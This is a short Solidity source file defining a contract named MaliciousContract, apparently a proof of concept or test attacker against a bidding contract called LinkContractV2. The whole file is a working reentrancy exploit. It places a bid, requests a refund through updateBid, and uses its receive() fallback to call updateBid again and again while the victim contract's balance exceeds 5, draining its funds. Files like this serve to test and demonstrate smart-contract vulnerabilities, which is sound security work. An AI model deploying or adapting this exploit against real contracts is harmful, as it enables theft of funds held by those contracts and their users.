// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./LinkV2.sol";

contract MaliciousContract {

    address victimAddress;

    constructor(address _victimAddress) payable {
        victimAddress = _victimAddress;
    }

    function depleteFunds() public {
        LinkContractV2(victimAddress).acceptNewBid{value: 10}(10);
        LinkContractV2(victimAddress).updateBid(5, false);
    }

    receive() external payable {
        if (victimAddress.balance > 5) {
            LinkContractV2(victimAddress).updateBid(5, false);
        }
    }
}